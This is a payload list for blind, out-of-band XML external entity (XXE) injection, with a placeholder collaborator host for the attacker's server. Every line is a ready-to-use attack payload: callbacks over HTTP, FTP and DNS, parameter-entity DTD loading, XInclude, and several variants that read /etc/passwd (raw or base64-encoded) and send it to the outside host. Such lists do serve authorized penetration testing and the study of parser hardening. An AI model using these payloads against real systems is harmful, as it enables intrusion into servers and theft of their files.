# XXE Out-of-Band (Blind XXE) Payloads
# Replace BURP_COLLABORATOR with your OOB server (e.g., xxx.oast.fun)

# Basic OOB
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "ftp://BURP_COLLABORATOR/xxe">]><foo>&xxe;</foo>

# DNS OOB
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe.BURP_COLLABORATOR">]><foo>&xxe;</foo>

# Parameter Entity OOB
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;%param1;]><foo></foo>

# External DTD with Data Exfiltration
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;]><foo></foo>

# Error-based OOB
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % xxe SYSTEM "http://BURP_COLLABORATOR/xxe.dtd">%xxe;%error;]><foo></foo>

# XInclude OOB
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://BURP_COLLABORATOR/xxe"/></foo>
